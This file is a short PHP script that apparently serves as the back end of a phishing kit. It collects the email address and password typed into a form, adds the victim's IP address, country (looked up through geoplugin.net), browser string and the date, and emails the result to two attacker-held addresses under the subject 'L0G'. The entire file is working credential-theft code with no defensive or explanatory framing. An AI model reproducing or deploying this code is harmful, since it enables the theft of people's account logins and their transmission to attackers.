<?php
session_start();
include("../email.php"); 

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

$email = $_REQUEST["email"];
$password = $_REQUEST["password"];
$ip = $_SERVER['REMOTE_ADDR'];
$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$subj = "L0G => $email";

$data=" 
----------
User : $email
Pass : $password
-----------------------------------
IPAdres : $ip
Country :  $country
AddDate : $adddate
UserAgent : $browser
-----------------------------------
";

mail($recipient1 , $subj , $data);
mail($rec2 , $subj , $data);

?>
